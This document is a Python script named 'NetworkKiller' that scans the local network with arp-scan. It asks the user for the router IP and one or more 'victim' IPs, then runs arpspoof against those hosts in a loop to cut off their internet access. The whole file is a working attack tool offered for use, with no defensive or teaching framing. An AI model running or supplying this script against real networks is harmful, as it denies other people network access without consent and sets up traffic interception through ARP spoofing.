#!/usr/bin/python3
#By: AstrumStorm

import os
import time
from colorama import Fore,init

RED_COLOUR = Fore.LIGHTRED_EX
GREEN_COLOUR = Fore.LIGHTGREEN_EX
MAGENTA_COLOUR = Fore.LIGHTMAGENTA_EX
WHITE_COLOUR = Fore.LIGHTWHITE_EX

clearConsole = lambda: (os.system('cls' if os.name == 'nt' else 'clear'))

if os.getuid() != 0:
    print(RED_COLOUR+'\nExecute this as root\n')
    exit(1)
else:
    pass

def banner():

    text = """
        _   __     __                      __   __ __ _ ____
       / | / /__  / /__      ______  _____/ /__/ //_/(_) / /__  _____
      /  |/ / _ \/ __/ | /| / / __ \/ ___/ //_/ ,<  / / / / _ \/ ___/
     / /|  /  __/ /_ | |/ |/ / /_/ / /  / ,< / /| |/ / / /  __/ /
    /_/ |_/\___/\__/ |__/|__/\____/_/  /_/|_/_/ |_/_/_/_/\___/_/
    """

    print(RED_COLOUR+text)

def check_tools():

    tools = ['arp-scan']

    if os.path.exists('/data/data/com.termux/files/home'):
        tools.append('ArpSpoof')
        termux = True

    else:
        tools.append('arpspoof')
        termux = False

    for program in tools:
        status = os.popen(f'command -v {program}').read()

        if len(status) == 0:
            print(f'\n{program} is not installed\n')
            exit(1)

    return termux

def red_scan():

    all_info = os.popen("sudo arp-scan --localnet --ignoredups | grep -v -E 'by filter|Ending arp|Interface:|Starting' | tr '\t' '&' | head -n -1").read()

    all_info = all_info.split('\n')

    all_info.pop()

    print(MAGENTA_COLOUR+'CLIENTS IN YOUR NET'.center(50,'-'))

    print('')

    all_ip = []


    for device in all_info:

        device = device.split('&')

        print(f'{RED_COLOUR}IP: {GREEN_COLOUR}{device[0]}   {RED_COLOUR}VENDOR: {GREEN_COLOUR}{device[2]}')

        all_ip.append(device[0])


    router_ip = input(GREEN_COLOUR+'\nType the router ip: '+WHITE_COLOUR)

    if router_ip not in all_ip:
        print(RED_COLOUR+f'\nError, {router_ip} does not exist\n')
        exit(1)
    else:
        pass

    victim = input(GREEN_COLOUR+'\nType victim(s) ip (separated by commas): '+WHITE_COLOUR)

    return router_ip, victim, all_ip


def directed_attack(gateway,victim_target,ip_list,termux):

    clearConsole()

    interface = os.popen("sudo arp-scan --localnet | grep 'Interface' | awk '{print $2}' | tr -d ','").read()

    interface = interface.replace('\n','')

    ip_list.remove(gateway)

    victim = victim_target.split(',')

    final_targets = []

    print(MAGENTA_COLOUR+'Checking targets'.center(50,'-'))

    print('')

    time.sleep(2)

    for final_victim in victim:
        final_victim = final_victim.strip()

        if final_victim not in ip_list:
            print(f'{RED_COLOUR}{final_victim} do not exist')
            time.sleep(.6)

        else:
            print(f'{GREEN_COLOUR}{final_victim} exist')
            time.sleep(.6)
            final_targets.append(final_victim)

    if len(final_targets) == 0:
        print(RED_COLOUR+'\nThere are not available targets\n')
        exit(1)
    else:
        pass


    if termux == True:

        command = f'sudo ArpSpoof --interface {interface} {gateway} '
        counter = 1

        for x in final_targets:

            if counter == 1:
                command += f'{x}'
            else:
                command += f',{x}'

            counter += 1

        clearConsole()
        print('')

        print(MAGENTA_COLOUR+'\rStarting Attack', end='')

        time.sleep(3)

        try:
            print(MAGENTA_COLOUR+'\rAttack Started')
            print(WHITE_COLOUR+'\nINFO: To kill the internet it can take up to a minute')
            print(Fore.LIGHTYELLOW_EX+"\nPress CTRL+C to stop")
            while True:
                os.system('timeout 50 '+command+' 2>/dev/null')
                time.sleep(12)
        except KeyboardInterrupt:
            print(RED_COLOUR+'\n\nExiting\n')
            exit(1)

    else:

        command = f'sudo arpspoof -i {interface} -r {gateway}'


        for x in final_targets:
            command += f' -t {x}'

        clearConsole()

        print('')

        print(MAGENTA_COLOUR+'\rStarting Attack', end='')

        time.sleep(3)

        try:
            print(MAGENTA_COLOUR+'\rAttack Started')
            print(WHITE_COLOUR+'\nINFO: To kill the internet it can take up to a minute')
            print(Fore.LIGHTYELLOW_EX+"\nPress CTRL+C to stop")
            os.system(command+' > /dev/null 2>&1')
        except KeyboardInterrupt:
            print(RED_COLOUR+'\n\nExiting\n')
            exit(1)

def main():

    banner()
    check = check_tools()
    try:
        gateway,victim,ip_list = red_scan()
    except KeyboardInterrupt:
        print(RED_COLOUR+'\n\nExiting..\n')
        exit(1)

    directed_attack(gateway,victim,ip_list,check)

if __name__ == '__main__':

    main()
